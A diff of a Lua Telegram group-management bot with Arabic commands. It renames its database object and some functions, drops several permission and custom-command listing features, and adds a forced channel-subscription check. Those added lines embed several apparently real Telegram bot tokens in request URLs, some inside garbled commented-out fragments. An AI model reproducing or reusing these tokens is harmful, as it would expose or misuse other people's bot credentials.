-database:del("MohaMeD:mute:deleta:msg:"..bot_id..msg.chat_id_)
+datahmade:del("MohaMeD:mute:deleta:msg:"..bot_id..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, "✔️┇تم تفعيل خاصيه الابلاغ", 1, 'html')
 end
 if text and text:match("(تعين عدد الابلاغ) (%d+)") then 
 local a = {string.match(text, "^(تعين عدد الابلاغ) (%d+)$")}
-database:set("tsahke:fel:o:me:"..bot_id..msg.chat_id_,a[2])
+datahmade:set("tsahke:fel:o:me:"..bot_id..msg.chat_id_,a[2])
 send(msg.chat_id_, msg.id_, 1, "👤┇تم تعين عدد الابلاغ {"..a[2].."}", 1, 'html')
 end
 if text == ("المدراء") then
 local hash =   'MohaMeD:'..bot_id..'owners:'..msg.chat_id_
-local list = database:smembers(hash)
+local list = datahmade:smembers(hash)
 text = "🛄┇قائمة المدراء  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -4138,7 +4071,7 @@ offset_ = offset or 0,
 limit_ = limit
 }, cb or dl_cb, nil)
 end
-function kekoididi(t1,t2)
+function ahmadididi(t1,t2)
 if t2.members_ then 
 for i=1,#t2.members_ do 
 bot.changeChatMemberStatus(msg.chat_id_, t2.members_[i].user_id_, "Left")
@@ -4146,32 +4079,32 @@ end
 send(msg.chat_id_, msg.id_, 1, '☑┇تم الغاء حظر {'..t2.total_count_..'} عضو', 1, 'md')
 end
 end
-getChannelMembers(msg.chat_id_,"Kicked",0,10000,kekoididi)
+getChannelMembers(msg.chat_id_,"Kicked",0,10000,ahmadididi)
 end
 
 if text == ("جلب الرسائل الاصليه") and msg.reply_to_message_id_ ~= 0 then
 function mute_by_reply(extra, result, success)
-database:del('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..result.sender_user_id_)
-local user_msgs = database:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_)
-send(msg.chat_id_, msg.id_, 1, "📨┇تم استعاد الرسائل  \n🔖┇عدد الرسائل الاصليه ~⪼ *{"..(user_msgs).."}*", 1, 'md')
+datahmade:del('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..result.sender_user_id_)
+local user_msgs = datahmade:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_)
+send(msg.chat_id_, msg.id_, 1, "📨┇تم استعاد الرسائل  \n📨┇عدد الرسائل الاصليه ~⪼ *{"..(user_msgs).."}*", 1, 'md')
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
 end
 
 if (text and (text == "تعطيل الرفع" or text == "تعطيل الترقيه")) then
-database:set('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_,"MohaMeD")
+datahmade:set('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_,"MohaMeD")
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل رفع ( الادمنيه - المميزين ) في المجموعه \n', 1, 'md')
 end
 if (text and (text == "تفعيل الرفع" or text == "تفعيل الترقيه")) then
-database:del('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل رفع ( الادمنيه - المميزين ) في المجموعه \n', 1, 'md')
 end
 if (text and (text == "تعطيل الطرد" or text == "تعطيل الحظر")) then
-database:set("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_,"MohaMeD")
+datahmade:set("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_,"MohaMeD")
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل (طرد - حضر) الاعضاء', 1, 'md')
 end
 if (text and (text == "تفعيل الطرد" or text == "تفعيل الحظر")) then
-database:del("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_)
+datahmade:del("MohaMeD:lock:ban_and_kick"..bot_id..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل (طرد - حضر) الاعضاء', 1, 'md')
 end
 if text == ("طرد المحذوفين") then
@@ -4232,122 +4165,87 @@ send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 5000}, check_deactive, nil)
 end
+if (text and text == "مسح صلاحيه") then
+send(msg.chat_id_, msg.id_, 1, '☑┇ارسال الان اسم الصلاحيه', 1, 'md')
+datahmade:set("tsahke:is_del_if:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok")
+return "MohaMeD"
+end  
+if (text and datahmade:get("tsahke:is_del_if:"..bot_id..msg.chat_id_..msg.sender_user_id_)) then 
+send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف صلاحيه بنجاح', 1, 'md')
+datahmade:del("MohaMeD:all_if:"..text..bot_id..msg.chat_id_)
+datahmade:del("tsahke:is_del_if:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+end 
 if text and text:match("^تغير رد المطور (.*)$") then
 ac = {string.match(text, "^تغير رد المطور (.*)$")}
-database:set("MohaMeD:name_sudo"..bot_id..msg.chat_id_,ac[1])
+datahmade:set("MohaMeD:name_sudo"..bot_id..msg.chat_id_,ac[1])
 send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
 end
 -------------------------------------------
 if text and text:match("^تغير رد المنشئ (.*)$") then
 ac = {string.match(text, "^تغير رد المنشئ (.*)$")}                     
-database:set("MohaMeD:name_cre"..bot_id..msg.chat_id_,ac[1])
+datahmade:set("MohaMeD:name_cre"..bot_id..msg.chat_id_,ac[1])
 send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
 end
 
 if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
 ac = {string.match(text, "^تغير رد منشئ الاساسي (.*)$")}                     
-database:set("MohaMeD:name_cre"..bot_id..msg.chat_id_,ac[1])
+datahmade:set("MohaMeD:name_cre"..bot_id..msg.chat_id_,ac[1])
 send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
 end
 ------------------------------------
 if text and text:match("^تغير رد المدير (.*)$") then
 ac = {string.match(text, "^تغير رد المدير(.*)$")}
-database:set("MohaMeD:name_own"..bot_id..msg.chat_id_,ac[1]) 
+datahmade:set("MohaMeD:name_own"..bot_id..msg.chat_id_,ac[1]) 
 send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
 end
 ------------------------------------
 if text and text:match("^تغير رد الادمن (.*)$") then
 ac = {string.match(text, "^تغير رد الادمن (.*)$")}
-database:set("MohaMeD:name_adm"..bot_id..msg.chat_id_,ac[1])
+datahmade:set("MohaMeD:name_adm"..bot_id..msg.chat_id_,ac[1])
 send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
 end
 --------------------------------
 if text and text:match("^تغير رد العضو المميز (.*)$") then
 ac = {string.match(text, "^تغير رد العضو المميز (.*)$")}
-database:set("MohaMeD:name_vipp"..bot_id..msg.chat_id_,ac[1])
+datahmade:set("MohaMeD:name_vipp"..bot_id..msg.chat_id_,ac[1])
 send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
 end
 -------------------------------
 if text and text:match("^تغير رد العضو فقط (.*)$") then
 ac = {string.match(text, "^تغير رد العضو فقط (.*)$")}
-database:set("MohaMeD:name_nk"..bot_id..msg.chat_id_,ac[1])
+datahmade:set("MohaMeD:name_nk"..bot_id..msg.chat_id_,ac[1])
 send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
 end
 --------------------------------
-if (text and text == "مسح صلاحيه") then
-send(msg.chat_id_, msg.id_, 1, '☑┇ارسال الان اسم الصلاحيه', 1, 'md')
-database:set("tsahke:is_del_sl:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok")
-return "MohaMeD"
-end  
-if (text and database:get("tsahke:is_del_sl:"..bot_id..msg.chat_id_..msg.sender_user_id_)) then 
-send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف صلاحيه بنجاح', 1, 'md')
-database:del("MohaMeD:all_sl:"..text..bot_id..msg.chat_id_)
-database:srem('MohaMeD:'..bot_id..'MohaMeDnwe:slahea:'..msg.chat_id_,text)
-database:del("tsahke:is_del_sl:"..bot_id..msg.chat_id_..msg.sender_user_id_)
-end 
 if (text and text == "اضف صلاحيه") then 
 send(msg.chat_id_, msg.id_, 1, '☑┇ارسال الان اسم الصلاحيه', 1, 'md')
-database:set("MohaMeD:new:sl:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
+datahmade:set("MohaMeD:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
 return "MohaMeD"
 end
-if text and database:get("MohaMeD:new:sl:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
-database:del("MohaMeD:new:sl:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+if text and datahmade:get("MohaMeD:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
+datahmade:del("MohaMeD:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
-database:set("MohaMeD:new:sl:text:"..bot_id..msg.chat_id_..msg.sender_user_id_,text)
-database:set("MohaMeD:new:sl2:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
-database:sadd('MohaMeD:'..bot_id..'MohaMeDnwe:slahea'..msg.chat_id_,text)
+datahmade:set("MohaMeD:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_,text)
+datahmade:set("MohaMeD:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
 return "MohaMeD"
 end
-if (text and database:get("MohaMeD:new:sl2:"..bot_id..msg.chat_id_..msg.sender_user_id_)) then 
+if (text and datahmade:get("MohaMeD:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_)) then 
 if (text == "ادمن" or text == "مدير" or text == "عضو مميز" or text == "لا شيئ") then 
-database:del("MohaMeD:new:sl2:"..bot_id..msg.chat_id_..msg.sender_user_id_)
-tsha_text = database:get("MohaMeD:new:sl:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+datahmade:del("MohaMeD:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+tsha_text = datahmade:get("MohaMeD:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 send(msg.chat_id_, msg.id_, 1, '☑️┇تم حفض الصلاحيه بنجاح \n⚠️┇الاوامر { رفع/تنزيل '..tsha_text..' }', 1, 'md')
-database:set("MohaMeD:all_sl:"..tsha_text..bot_id..msg.chat_id_,text)
-database:set("MohaMeDnwe:slahea:bot"..tsha_text..bot_id..msg.chat_id_,text)
-database:del("MohaMeD:new:sl:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+datahmade:set("MohaMeD:all_if:"..tsha_text..bot_id..msg.chat_id_,text)
+datahmade:del("MohaMeD:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 else 
-send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '??┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
 end
-end
-if text =='مسح الصلاحيات' then 
-local list = database:smembers('MohaMeD:'..bot_id..'MohaMeDnwe:slahea'..msg.chat_id_)
-for k,v in pairs(list) do
-local list = database:smembers('MohaMeD:'..bot_id..'MohaMeD:users:sl'..msg.chat_id_)
-for k,ks in pairs(list) do
-ts_text = database:get("MohaMeD:all_sl:"..v..bot_id..msg.chat_id_)
-if ts_text then 
-database:del("MohaMeD:name_user:"..bot_id..msg.chat_id_..ks)
-end
-end
-database:del("MohaMeD:all_sl:"..v..bot_id..msg.chat_id_)
-database:del("MohaMeDnwe:slahea:bot"..v..bot_id..msg.chat_id_)
-end
-database:del('MohaMeD:'..bot_id..'MohaMeDnwe:slahea'..msg.chat_id_)
-send(msg.chat_id_, msg.id_, 1, '📮┇تم مسح الصلاحيات \n', 1, 'md')
 end
 
-if text == 'الصلاحيات' then
-local list = database:smembers('MohaMeD:'..bot_id..'MohaMeDnwe:slahea'..msg.chat_id_)
-if #list == 0 then
-send(msg.chat_id_, msg.id_, 1,'🔖┇لا توجد صلاحيات مضافه', 'html')
-return false
-end
-t = '📝┇قائمه الصلاحيات المضافه هنا\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n'
-for k,v in pairs(list) do
-var = database:get("MohaMeDnwe:slahea:bot"..v..bot_id..msg.chat_id_)
-if var then
-t = t..''..k..'- '..v..' » ('..var..')\n'
-else
-t = t..''..k..'- '..v..'\n'
-end
-end
-send(msg.chat_id_, msg.id_, 1,t, 'html')
-end
 
 if text == 'فحص البوت' then
 local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
 local Json_Info = JSON.decode(Chek_Info)
+vardump(Json_Info)
 if Json_Info.ok == true then
 if Json_Info.result.status == "administrator" then
 if Json_Info.result.can_change_info == true then
@@ -4373,7 +4271,7 @@ if tonumber(kara[2]) > 500 or tonumber(kara[2]) < 1 then
 msgg = '📌┇لا تستطيع وضع اكثر من 500 رساله ❌ '
 send(msg.chat_id_, msg.id_, 1, msgg, 1, 'html')
 else
-database:set('MohaMeD:'..bot_id..'gamepoint' .. msg.chat_id_, kara[2] or 50)
+datahmade:set('MohaMeD:'..bot_id..'gamepoint' .. msg.chat_id_, kara[2] or 50)
 send(msg.chat_id_, msg.id_, 1,'💎┇تم اضافه عدد الرسائل المطلوب ✅  ', 1, 'md')
 end
 end
@@ -4381,7 +4279,7 @@ end
 if text == ("منح الحظر") and msg.reply_to_message_id_ ~= 0 then
 function by_reply(extra, result, success)
 tsX000("prore",msg,"☑┇تم منحه صلاحية الحظر")
-database:sadd('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_, result.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_, result.sender_user_id_)
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,by_reply)
 end
@@ -4393,7 +4291,7 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")   
 return false 
 end      
-database:sadd('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n☑┇تم منحه صلاحية الحظر'
 else
 texts = '✖┇خطاء'
@@ -4406,7 +4304,7 @@ end
 if text == ("الغاء منح الحظر") and msg.reply_to_message_id_ ~= 0 then
 function by_reply(extra, result, success)
 tsX000("prore",msg,"☑┇تم الغاء منحه صلاحية الحظر")
-database:srem('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_, result.sender_user_id_)
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,by_reply)
 end
@@ -4414,7 +4312,7 @@ if text and text:match("^الغاء منح الحظر @(.*)$") then
 local apmd = {string.match(text, "^(الغاء منح الحظر) @(.*)$")}
 function promote_by_username(extra, result, success)
 if result.id_ then
-database:srem('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n☑┇تم الغاء منحه صلاحية الحظر'
 else
 texts = '✖┇خطاء'
@@ -4425,15 +4323,15 @@ resolve_username(apmd[2],promote_by_username)
 end
 
 if text == 'مسح صلاحية الحظر' then
-database:del('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '☑┇تم مسح قائمه صلاحيات الحظر', 1, 'md')
 end
 if text == ("قائمه صلاحيه الحظر") then
 local hash =  'MohaMeD:'..bot_id..'SET:BAN'..msg.chat_id_
-local list = database:smembers(hash)
+local list = datahmade:smembers(hash)
 text = "👥┇قائمة صلايحه الحظر ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -4450,69 +4348,38 @@ text = "✖┇لايوجد اشخاص لديهم صلاحيه الحظر"
 end
 send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end
+
 if text and text:match("اضف امر (.*)") then 
 local MohaMeD_edis = {string.match(text, "^اضف امر (.*)$")}
 send(msg.chat_id_, msg.id_, 1, "☑┇ ارسال الان الامر الجديد", 1, 'md')
-database:set("tsahke:new:msg:amr:"..msg.chat_id_..msg.sender_user_id_..bot_id,MohaMeD_edis[1])
-database:sadd('MohaMeD:'..bot_id..'MohaMeDnwe:'..msg.chat_id_,MohaMeD_edis[1])
-elseif (database:get("tsahke:new:msg:amr:"..msg.chat_id_..msg.sender_user_id_..bot_id)) then 
+datahmade:set("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id,MohaMeD_edis[1])
+elseif (datahmade:get("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id)) then 
 send(msg.chat_id_, msg.id_, 1, "☑┇ تم الحفظ بنجاح", 1, 'md')
-database:set("MohaMeD:edit:text:su:newamr:"..bot_id..msg.chat_id_..database:get("tsahke:new:msg:amr:"..msg.chat_id_..msg.sender_user_id_..bot_id),text)
-database:set("MohaMeD:edit:text:su:newamr2:"..bot_id..msg.chat_id_..text,database:get("tsahke:new:msg:amr:"..msg.chat_id_..msg.sender_user_id_..bot_id))
-database:del("tsahke:new:msg:amr:"..msg.chat_id_..msg.sender_user_id_..bot_id)
+datahmade:set("MohaMeD:edit:text:su:new:"..bot_id..msg.chat_id_..datahmade:get("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id),text)
+datahmade:set("MohaMeD:edit:text:su:new2:"..bot_id..msg.chat_id_..text,datahmade:get("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id))
+datahmade:del("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id)
 end  
 if text and text:match("^مسح امر (.*)") then 
 local t = {string.match(text, "^مسح امر (.*)$")}
-local klma = database:get("MohaMeD:edit:text:su:newamr:"..bot_id..msg.chat_id_..t[1])
+local klma = datahmade:get("MohaMeD:edit:text:su:new:"..bot_id..msg.chat_id_..t[1])
 if klma ~= nil then
-database:del("MohaMeD:edit:text:su:newamr2:"..bot_id..msg.chat_id_..klma)
-database:del("MohaMeD:edit:text:su:newamr:"..bot_id..msg.chat_id_..t[1])
-database:srem('MohaMeD:'..bot_id..'MohaMeDnwe:'..msg.chat_id_,klma)
+datahmade:del("MohaMeD:edit:text:su:new2:"..bot_id..msg.chat_id_..klma)
+datahmade:del("MohaMeD:edit:text:su:new:"..bot_id..msg.chat_id_..t[1])
 send(msg.chat_id_, msg.id_, 1, "☑┇ تم المسح بنجاح", 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, "☑┇ عذرآ لا يوجد امر بهاذا الاسم", 1, 'md')
 end
 end
-if text == 'الاوامر الاضافيه' then
-local list = database:smembers('MohaMeD:'..bot_id..'MohaMeDnwe:'..msg.chat_id_)
-if #list == 0 then
-send(msg.chat_id_, msg.id_, 1,'🔖┇لا توجد اوامر مضافه', 'html')
-return false
-end
-t = '📝┇قائمه الاوامر المضافه هنا\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n'
-for k,v in pairs(list) do
-var = database:get("MohaMeD:edit:text:su:newamr:"..bot_id..msg.chat_id_..v)
-if var then
-t = t..''..k..'- '..v..' » ('..var..')\n'
-else
-t = t..''..k..'- '..v..'\n'
-end
-end
-send(msg.chat_id_, msg.id_, 1,t, 'html')
-end
-
-if text == 'مسح الاوامر المضافه' then 
-local list = database:smembers('MohaMeD:'..bot_id..'MohaMeDnwe:'..msg.chat_id_)
-for k,v in pairs(list) do
-local klma = database:get("MohaMeD:edit:text:su:newamr:"..bot_id..msg.chat_id_..v)
-if klma ~= nil then
-database:del("MohaMeD:edit:text:su:newamr2:"..bot_id..msg.chat_id_..klma)
-database:del("MohaMeD:edit:text:su:newamr:"..bot_id..msg.chat_id_..v)
-end
-end
-database:del('MohaMeD:'..bot_id..'MohaMeDnwe:'..msg.chat_id_)
-send(msg.chat_id_, msg.id_, 1,"📛┇تم مسح الاوامر جميعها", 'md')
-end
 
 
 end -- if is_creator(msg) then
 ------------------------------------------------------------------------
-if is_devabas(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creatorr(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) or is_owner(msg) or is_ownerr(msg.chat_id_,msg.sender_user_id_) and ChekAdd(msg.chat_id_) == true then 
+if is_devahmad(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creatorr(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) or is_owner(msg) or is_ownerr(msg.chat_id_,msg.sender_user_id_) and ChekAdd(msg.chat_id_) == true then 
 if text == ("تثبيت") then
 local id = msg.id_
 local msgs = {[0] = id}
 pin(msg.chat_id_,msg.reply_to_message_id_,0)
-database:set('MohaMeD:'..bot_id..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
+datahmade:set('MohaMeD:'..bot_id..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
 send(msg.chat_id_, msg.id_, 1, '📌┇ تم تثبيت الرسالة  ',1, 'md')
 return false
 end
@@ -4522,21 +4389,21 @@ send(msg.chat_id_, msg.id_, 1, '❌┇تم الغاء تثبيت الرساله'
 return false
 end
 if text == ("رفع ادمن") and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
-if not is_creator(msg) and database:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
+if not is_creator(msg) and datahmade:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
 return false
 end
 function promote_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'mods:'..msg.chat_id_
-if database:sismember(hash, result.sender_user_id_) then
+if datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,'🔖┇بالفعل تم رفعة ادمن   في البوت ')
 else
-database:sadd(hash, result.sender_user_id_)
+datahmade:sadd(hash, result.sender_user_id_)
 tsX000("prore",msg,'🔖┇تم رفعة ادمن   في البوت ')
 end
 end
@@ -4544,12 +4411,12 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 return false
 end
 if text and text:match("^رفع ادمن @(.*)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
-if not is_creator(msg) and database:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
+if not is_creator(msg) and datahmade:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
 return false
 end
@@ -4560,7 +4427,7 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")   
 return false 
 end      
-database:sadd('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n🔖┇تم رفعة ادمن   في البوت'
 else
 texts = '✖┇خطاء'
@@ -4571,31 +4438,31 @@ resolve_username(apmd[2],promote_by_username)
 return false
 end
 if text and text:match("^رفع ادمن (%d+)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
